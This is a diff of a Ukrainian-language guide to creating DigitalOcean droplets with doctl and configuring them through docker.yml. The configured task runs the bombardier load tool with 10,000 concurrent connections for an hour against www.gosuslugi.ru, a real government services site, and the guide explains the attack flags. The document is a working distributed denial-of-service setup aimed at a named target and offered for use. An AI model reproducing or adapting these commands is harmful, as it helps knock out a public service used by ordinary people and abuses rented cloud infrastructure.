@@ -11,9 +11,14 @@
 
 За замовчанням ви можете створити 10 віртуальних машин вартістю $5 на місяць, цього досить.
 Невеличке пояснення що ви створюєте, команда виглядає так:
+
 doctl compute droplet create --region tor1 --image centos-7-x64 --size s-1vcpu-1gb --ssh-keys 30188579  zero0
-Нас в ній цікавить --region tor1 - регіон в якому буде створений дроплет, перелік регіонів можна отримати так: doctl compute region list
+
+Нас в ній цікавить --region tor1 - регіон в якому буде створений дроплет, перелік регіонів можна отримати так: 
+doctl compute region list
+
 отримаете приблизно такий перелік:
+
 doctl compute region list
 Slug    Name               Available
 nyc1    New York 1         true
@@ -32,15 +37,18 @@ sfo3    San Francisco 3    true
 
 --ssh-keys 30188579 - ключ доступу до дроплета, отримати перелік ключів можна так: doctl compute ssh-key list
 отримаемо схожу відповідь:
+
 doctl compute ssh-key list
 ID          Name        FingerPrint
 30245974    oracle      73:dd:87:ed:05:40:58:26:25:1d:7d:b2:b0:5f:ab:1e
 30188579    home        44:10:69:cd:39:cd:ac:01:04:92:a0:78:37:77:29:9b
+
 Нам треба вказати --ssh-keys <ID> Вашого ключа, вони індивідуальні.
 zero0 - це ім'я дроплету.
 крім того можемо відредагувати файл docker.yml
 нас цікавить тільки рядок
-shell: "docker run -ti --rm alpine/bombardier -c 10000 -d 3600s -l www.gosuslugi.ru"
+
+ shell: "docker run -ti --rm alpine/bombardier -c 10000 -d 3600s -l www.gosuslugi.ru"
 
 де
 -с 10000 - кількість одночасно надісланих запитів
